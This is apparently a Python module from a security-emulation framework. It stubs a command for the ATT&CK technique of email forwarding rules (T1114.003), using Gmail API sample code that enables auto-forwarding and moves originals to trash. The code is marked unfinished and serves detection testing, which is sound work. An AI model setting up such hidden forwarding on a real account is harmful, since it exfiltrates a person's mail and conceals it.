
from dataclasses import dataclass
from typing import Optional

import google.auth
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError

from marshmallow.validate import Email

from swat.mixins import MarshmallowDataclassMixin
from swat.commands.emulate import ArgsClass, AttackMeta, BaseEmulationCommand


META = AttackMeta(
    tactic='Collection',
    technique_ids=['T1114.003'],
    references=[]
)


@dataclass
class Args(ArgsClass):

    forwarding_email: Email
    user_id: str
    enabled: Optional[bool] = True


class Command(BaseEmulationCommand):

    arg_class = Args
    meta = META

    def __init__(self, **kwargs) -> None:
        super().__init__(**kwargs)

    def execute(self) -> None:
        print("hello world")

    def forward_email(self):
        """Add a forwarding email rule."""
        # TODO: this doesn't work yet, just a copy from:
        # https://developers.google.com/gmail/api/guides/forwarding_settings#python

        """Enable email forwarding.
        Returns:Draft object, including forwarding id and result meta data.

        Load pre-authorized user credentials from the environment.
        TODO(developer) - See https://developers.google.com/identity
        for guides on implementing OAuth2 for the application.
        """
        creds, _ = google.auth.default()

        try:
            # create gmail api client
            service = build('gmail', 'v1', credentials=creds)

            address = {'forwardingEmail': 'gduser1@workspacesamples.dev'}

            # pylint: disable=E1101
            result = service.users().settings().forwardingAddresses(). \
                create(userId='me', body=address).execute()
            if result.get('verificationStatus') == 'accepted':
                body = {
                    'emailAddress': result.get('forwardingEmail'),
                    'enabled': True,
                    'disposition': 'trash'
                }
                # pylint: disable=E1101
                result = service.users().settings().updateAutoForwarding(
                    userId='me', body=body).execute()
                print(f'Forwarding is enabled : {result}')

        except HttpError as error:
            print(f'An error occurred: {error}')
            result = None

        return result
